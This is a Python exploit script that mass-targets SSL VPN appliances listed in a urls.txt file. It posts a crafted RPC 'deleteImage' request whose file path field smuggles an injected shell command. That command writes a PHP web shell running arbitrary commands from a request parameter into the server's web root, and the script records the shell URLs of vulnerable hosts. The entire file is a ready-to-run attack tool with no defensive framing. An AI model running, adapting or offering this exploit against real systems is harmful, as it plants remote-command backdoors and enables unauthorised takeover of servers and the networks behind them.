# -*- coding: utf-8 -*-
import requests
import re
import sys
import urllib3
from rich.console import Console
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__author__ = "K0uSAOF"
console = Console()

payload = '''
{
    "action": "SSLVPN_Resource",
    "method": "deleteImage",
    "data":[{
      "data":["/var/www/html/b.txt;echo '<?php @system($_REQUEST[a]);?>'>/var/www/html/bda.php"]
    }],
    "type": "rpc",
    "tid": 17
}
'''
head = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0","Connection": "close"}
proxies = {'http:':'http://127.0.0.1:33210','https':'http://127.0.0.1:33210'}

def exploit(url):
    '''
    批量对目标进行webshell上传测试
    '''
    target = url + "/directdata/direct/router"
    upload_path = url + "/bda.php"

    try:
        res = requests.post(target,headers=head,timeout=5,verify=False,data=payload)
        res.encoding = 'utf-8'

        if res.status_code == 200 and 'success' in res.text:
            console.log(f"[green][+] Target is vuln, upload to --> %s" %upload_path)
            with open('vuln.txt','a') as f:
                f.write(upload_path + '\n')
        else:
            console.log("[yellow][!] Target is not vuln -->%s" %url)
    except Exception as e:
        console.log("[red][!] Error: %s" %e)

def main():
    with open('urls.txt','r') as f:
        urls = f.readlines()
        with console.status("[bold green]Exploiting...") as status:
            for url in urls:
                url = url.replace("\n","")
                console.log("[yellow][+] start exploit --> %s" %url)
                exploit(url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.log(f"[yellow][!] Bye!")
